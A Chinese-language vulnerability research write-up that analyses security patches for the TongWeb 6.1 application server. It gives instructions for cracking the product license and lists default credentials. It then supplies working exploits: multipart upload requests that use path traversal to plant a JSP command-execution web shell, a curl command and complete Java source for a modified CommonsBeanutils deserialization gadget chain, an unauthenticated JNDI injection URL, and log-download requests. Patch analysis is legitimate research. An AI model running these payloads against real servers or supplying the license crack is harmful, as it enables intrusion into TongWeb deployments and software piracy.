# TongWeb

## 环境搭建
Tongweb安装，双击`Install_TW6.1.5.13_Enterprise_JDK_Windows.exe`。一直点击下一步即可。安装完成后，从bin目录下的`startserver.bat`文件启动tongweb。如果控制台出现`TongWeb server startup complete`即启动成功

访问`http://ip:9060/console`，如果成功看到TongWeb管理控制台界面即成功。tongweb6.1登陆`用户名:thanos 密码:thanos123.com`

**license破解**

twnt.jar是license相关包，破解的twnt.jar放到lib目录下替换，并在tongweb根目录下创建一个空的license.dat。有的破解twnt.jar可能已经失效，例如启动tongweb时报错license过期。针对license过期的问题，修改`com.tongtech.a.b.a.a.a`类中`end_date`字段值，例如修改为2025-10-10

**修改jar包的技巧**

假如想要替换jar包中某个类的内容。新建一个IDEA工程，选取TongWeb对应的JDK版本，例如1.7，在src目录下，根据想要替换的类的package路径创建一个类，然后复制源类中的内容并进行修改，然后点击IDEA的build，生成out文件夹下对应的.class文件，复制出来。用7zip打开jar包，用生成的.class替换掉原文件即可。

**相关用户名和密码**
```
# console
thanos thanos123.com

# sysweb
cli cli123.com
```



## 补丁分析
补丁地址： http://www.tongtech.com/Services/Services-103_2.html

根据补丁的发布顺序，官方修复的信息大致如下
```
(1) 关闭命令行运维用户的上传文件功能
(2) 修复控制台命令执行、文件上传 、XSS和未授权访问问题
(3) 修复管理控制台文件上传和下载问题
(4) 修复未授权JNDI注入、控制台命令执行问题
(5) 修复命令执行、未授权访问、文件上传/下载/删除等问题
```

**(1) 关闭命令行运维用户的上传文件功能**

补丁修复位于`\applications\sysweb\WEB-INF\web.xml`，直接将补丁替换原文件即可，对比补丁和原文件，发现删除了如下几行
```
	<servlet>
		<servlet-name>upload</servlet-name>
		<servlet-class>com.tongweb.admin.jmx.remote.server.servlet.AppUploadServlet</servlet-class>
	</servlet>
	<servlet-mapping>
		<servlet-name>upload</servlet-name>
		<url-pattern>/upload</url-pattern>
	</servlet-mapping>
```

这个访问路径为`http://ip:9060/sysweb/upload`，默认的用户名`cli`，密码`cli123.com`

<details>
  <summary>AppUploadServlet代码</summary>
  <pre>
  <code>
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        PrintWriter out = resp.getWriter();
        InputStream is = null;
        FileOutputStream fos = null;
        String tempPath = System.getProperty("tongweb.home") + File.separator + "temp";
        String filePath = tempPath + File.separator + "upload";
        try {
            Iterator i$ = req.getParts().iterator();
            while(i$.hasNext()) {
                Part p = (Part)i$.next();
                is = p.getInputStream();
                String header = p.getHeader("content-disposition");
                String fileName = this.parseFileName(header); // return header.substring(header.lastIndexOf("=") + 1, header.length());
                File file = new File(filePath, fileName);
                if (!file.exists()) {
                    File temp = new File(filePath);
                    if (!temp.exists()) {
                        temp.mkdir();
                    }
                    file.createNewFile();
                }
                fos = new FileOutputStream(file);
                byte[] buffer = new byte[1856219];
                while(true) {
                    int bytedata = is.read(buffer);
                    if (bytedata == -1) {
                        break;
                    }
                    fos.write(buffer, 0, bytedata);
                }
            }
            out.write("success!");
        } catch (IOException var18) {
            out.write("fail to upload\n");
            var18.printStackTrace();
        } finally {
            if (is != null) {
                is.close();
            }
            if (out != null) {
                out.flush();
                out.close();
            }
            if (fos != null) {
                fos.flush();
                fos.close();
            }
        }
    }
  </code>
  </pre>
</details>

下面发包过程存在一个坑，主要是AppUploadServlet代码中在获取fileName时用了parseFileName方法，该方法截取最后一个等号后的内容，然后和Tongweb的安装目录`C:\TongWeb6.1\temp\upload`进行拼接。

如果直接上传文件，一般filename="c.jsp"，这样拼接完的路径是`C:\TongWeb6.1\temp\upload\"c.jsp"`，而Windows又禁止文件名包含`\ / : * ? " < > |`其中的一个。所以在抓包时，将filename后面的引号去掉，并且可以跨目录
```
POST /sysweb/upload HTTP/1.1
Authorization: Basic Y2xpOmNsaTEyMy5jb20=
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaYguOre6zCdYZhE1

------WebKitFormBoundaryaYguOre6zCdYZhE1
Content-Disposition: form-data; name="filename"; filename=../../applications/console/c.jsp
Content-Type: application/octet-stream

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
------WebKitFormBoundaryaYguOre6zCdYZhE1--
```

这个数据包还有个值得注意的点`Authorization: Basic Y2xpOmNsaTEyMy5jb20=`，Basic后的字段解码为`cli:cli123.com`。也就是sysweb模块是用base64用户名:密码做身份认证的，

**解决远程调试断点无法命中**

这个漏洞在远程调试时存在断点无法命中的问题。解决这个问题就需要打jar包。根据class的package全限定名`package com.tongweb.admin.jmx.remote.server.servlet`。将目录切到com的所在目录`TongWeb6.1/applications/sysweb/WEB-INF/classes/`下，利用如下命令进行打包
```
jar cvf testsysweb.jar *
```
然后将该jar包添加到lib中，这样将断点打到该jar包中的AppUploadServlet类中，即可命中。

**(2) 修复控制台命令执行、文件上传、存储型XSS和未授权访问问题**

这四个补丁都是针对于控制台的，分别看一下补丁的位置。

**（1）文件上传**

补丁打在了`com.tongweb.console.deployer.controller.Upload类`，这个的访问地址`/console/Upload`
```java
public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String method = request.getParameter("method"); // 想要调用upload方法，需要method参数为upload
    if (method.equals("upload")) {
        this.upload(request, response);
    }
}
```
upload方法利用组件commons-fileupload-1.3.3.jar进行文件上传操作，具体代码点击展开
<details>
  <summary>Upload代码</summary>
  <pre>
  <code>
    public void upload(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        response.setContentType("text/html");
        response.setCharacterEncoding("UTF-8");
        long MAX_SIZE = 1073741824L;
        String tempPath = System.getProperty("tongweb.home") + File.separator + "temp";
        String filePath = tempPath + File.separator + "upload";
        File uploadApplicationDir = new File(filePath);
        if (!uploadApplicationDir.exists()) {
            uploadApplicationDir.mkdir();
        }
        String jsonp = request.getParameter("callback");
        DiskFileItemFactory dfif = new DiskFileItemFactory();
        dfif.setSizeThreshold(5120);
        dfif.setRepository(new File(tempPath));
        ServletFileUpload sfu = new ServletFileUpload(dfif);
        sfu.setSizeMax(1073741824L);
        PrintWriter out = response.getWriter();
        final HttpSession session = request.getSession();
        sfu.setProgressListener(new ProgressListener() {
            private long temp = -1L;
            public void update(long readBytes, long totalBytes, int item) {
                if (this.temp != readBytes) {
                    this.temp = readBytes;
                    if (readBytes != -1L) {
                        session.setAttribute("readBytes", "" + readBytes);
                        session.setAttribute("totalBytes", "" + totalBytes);
                    }
                }
            }
        });
        List fileList = null;
        try {
            fileList = sfu.parseRequest(request);
        } catch (FileUploadException var23) {...}
        Iterator fileItr = fileList.iterator();
        while(fileItr.hasNext()) {
            FileItem fileItem = null;
            String path = null;
            fileItem = (FileItem)fileItr.next();
            if (fileItem != null && !fileItem.isFormField()) {
                path = fileItem.getName();
                path.substring(path.lastIndexOf("/") + 1);
                String t_name = path.substring(path.lastIndexOf("\\") + 1);
                String u_name = filePath + File.separator + t_name;
                try {
                    synchronized(u_name) {
                        fileItem.write(new File(u_name));
                    }
                } catch (Exception var22) {
                    var22.printStackTrace();
                }
            }
        }
    }
  </code>
  </pre>
</details>

发送文件上传数据包，这里就不用关注filename是否包含引号的问题了，但是数据包可以看出console用的cookie做身份认证。
```
POST /console/Upload?method=upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBZshdxEqKekYAuiB
Cookie: console-58ef4bbb-6bb7=1D37708C8D90C4EB41147ED6DB076BEF

------WebKitFormBoundaryBZshdxEqKekYAuiB
Content-Disposition: form-data; name="filename"; filename="../../applications/console/k.jsp"
Content-Type: application/octet-stream

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
------WebKitFormBoundaryBZshdxEqKekYAuiB--
```

补丁修复，在upload方法的文件内容写入部分之前，加入`UploadFileValidation.checkUploadDeployFile(filePath, path);`检查。代码如下。主要做了两件事（1）判断路径是否存在目录穿越的`..` (2) 判断文件后缀是否为`.war、.ear、.rar、.jar`
<details>
  <summary>checkUploadDeployFile代码</summary>
  <pre>
  <code>
    public static ResultInfo checkUploadDeployFile(String filePath, String fileName) {
        ResultInfo result = new ResultInfo();
        result.setSuccess(true);
        try {
            File file = new File(filePath, fileName);
            File parentfile = new File(filePath);
            String oldParentPath = parentfile.getCanonicalPath();
            String newParentPath = file.getParentFile().getCanonicalPath();
            if (!oldParentPath.equals(newParentPath)) {
                result.setErrorInfo("Illegal upload path!");
                result.setSuccess(false);
                return result;
            }
            String realname = file.getName();
            String validate = realname.substring(realname.lastIndexOf("."));
            if (!validate.equals(".war") && !validate.equals(".ear") && !validate.equals(".rar") && !validate.equals(".jar") && !validate.equals(".car")) {
                result.setErrorInfo("Illegal document! fail to upload!");
                result.setSuccess(false);
                return result;
            }
        } catch (Exception var9) {
            var9.printStackTrace();
        }
        return result;
    }
  </code>
  </pre>
</details>

**（2）未授权访问**
```
    @GET
    @Path("disk")
    @Produces({"text/html"})
    public String listRoots() {
        StringBuffer sb = new StringBuffer();
        File[] roots = File.listRoots();
        File[] arr$ = roots;
        int len$ = roots.length;

        for(int i$ = 0; i$ < len$; ++i$) {
            File f = arr$[i$];
            sb.append(f.toString() + ",");
        }

        return System.getProperties().getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1 ? sb.substring(0, sb.length() - 1).replace("\\", "/") : sb.substring(0, sb.length() - 1);
    }
```
**（3）命令执行**

补丁位置位于`com.tongweb.admin.jmx.remote.server.servlet.RemoteJmxConnectorServlet`，其readRequestMessage方法增加了数据流内容校验，如果数据流中包含`java/lang/Runtime`或者`new ServerSocket`就抛出异常。其原本代码如下，明显的反序列化漏洞
```java
    private Message readRequestMessage(HttpServletRequest request) throws IOException, ClassNotFoundException {
        JMXInbandStream.setOutputStream((InputStream)null, 0L);
        InputStream in = request.getInputStream();
        ObjectInputStream ois = new ObjectInputStream(in);
        MBeanServerRequestMessage m = (MBeanServerRequestMessage)ois.readObject();
        StreamMBeanServerRequestMessage streamm = (StreamMBeanServerRequestMessage)m;
        if (streamm.isStreamAvailable()) {
            JMXInbandStream.setIncomingStream(new JMXChunkedInputStream(in));
        }

        logger.fine("Method id is: " + m.getMethodId());
        return m;
    }
```
请求入口是doPost。由于RemoteJmxConnectorServlet位于sysweb中，查看sysweb模块下的web.xml内容，发现此类的访问路径是`/rjcs`
```java
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    this.processRequest(request, response);
}

protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    try {
        String pathInfo = request.getPathInfo();
        if (pathInfo != null && pathInfo.trim().equals("/NotificationManager")) {
            this.requestHandler.getNotificationManager().getNotifications(request, response);
        } else {
            Message requestMessage = this.readRequestMessage(request);
            ...
	}
```
这样发包的payload如下（上文提到sysweb模块存在Authorization的验证）
```
curl -X POST "http://172.16.165.146:9060/sysweb/rjcs"  --data-binary @test2.txt -H "Authorization: Basic Y2xpOmNsaTEyMy5jb20="
```
需要注意的是，TongWeb中存在commons-beanutils.jar，但是和原生的commons-beanutils.jar不同，原生利用类`org.apache.commons.beanutils.BeanComparator`路径都变为了`com.tongweb.commons.beanutils.BeanComparator`，所以ysoserial无法直接使用，需要改一下CB1的生成过程
<details>
  <summary>CB1改造代码</summary>
  <pre>
  <code>
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.tongweb.commons.beanutils.BeanComparator;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
//
public class CB1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static TemplatesImpl generateTemplates(String code) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        cc.makeClassInitializer().insertBefore(code);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        return newTemplatesWithClassBytes(classBytes);
    }
    private static TemplatesImpl newTemplatesWithClassBytes(byte[] classBytes) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
    public static byte[] getPayload() throws Exception {
        TemplatesImpl obj = generateTemplates("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return barr.toByteArray();
    }
    public static void main(String[] args) throws Exception {
        byte[] payload = getPayload();
        saveFile("test2.txt",payload);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
//        ois.readObject();
    }
    public static void saveFile(String filename,byte [] data)throws Exception{
        if(data != null){
            String filepath ="/Users/dxy/Downloads/" + filename;
            File file  = new File(filepath);
            if(file.exists()){
                file.delete();
            }else {
                file.createNewFile();
            }
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(data,0,data.length);
            fos.flush();
            fos.close();
        }
    }
}
  </code>
  </pre>
</details>

**(3) 修复管理控制台文件上传和下载问题**

补丁位置：`com.tongweb.agent.com.FileTransferUtil`

**(4) 修复未授权JNDI注入、控制台命令执行问题**

未授权JNDI注入，poc如下
```
http://ip:9060/console/rest/jca/nameCheck?name=rmi://ip:1099/jzr8wb
```
漏洞点位于`com.tongweb.console.jca.controller.JCAController#checkJNDIName`
```
    @GET
    @Path("nameCheck")
    @Produces({"application/xml", "application/json"})
    public void checkJNDIName(@QueryParam("name") String name) {
        PrintWriter writer = null;
        try {
            writer = this.response.getWriter();
            writer.print(this.jcaService.checkJNDIName(name)); // checkJNDIName调用了lookup
            writer.close();
        } ...
    }
    
    public boolean checkJNDIName(String name) throws Exception {
        Object old = (new InitialContext()).lookup(name.trim());
    }
```

**(5) 修复命令执行、未授权访问、文件上传/下载/删除等问题**

**(1) Log任意下载漏洞**
先查询有那些日志，然后填入names参数下载对应日志
```
GET http://ip:9060/console/rest/log/allFiles
POST http://ip:9060/console/rest/log/downloadLog?names=server.log
```

**（2）修复管理控制台未授权访问漏洞**
com.tongweb.console.security.controller.UserController#create/update

**（3）命令执行漏洞**

**（4）console存在命令行执行漏洞**

**（5）修复任意文件删除漏洞**

**（6）访问日志-任意文件写入&路径穿越漏洞**
com.tongweb.console.webcontainer.controller.AccessLogController
com.tongweb.server.ExternalOptions

**（7）spring、CommonsCollections、XStream漏洞**
xmlpull、CommonsCollections、XStream组件升级

**（8）EJB远程调用反序列化漏洞**
com.tongweb.tongejb.server.httpd.ServerServlet

com.tongweb.tongejb.client.EjbObjectInputStream
